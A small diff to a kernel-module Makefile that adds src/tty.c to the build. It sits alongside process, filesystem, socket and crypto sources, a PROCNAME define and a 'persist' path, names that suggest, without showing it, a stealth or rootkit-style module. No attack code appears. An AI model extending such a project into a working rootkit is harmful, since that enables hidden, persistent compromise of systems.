@@ -32,7 +32,7 @@ COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
 SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
-	src/sock.c src/util.c src/vm.c src/crypto.c
+	src/sock.c src/util.c src/vm.c src/crypto.c src/tty.c
 
 persist=src/persist
 
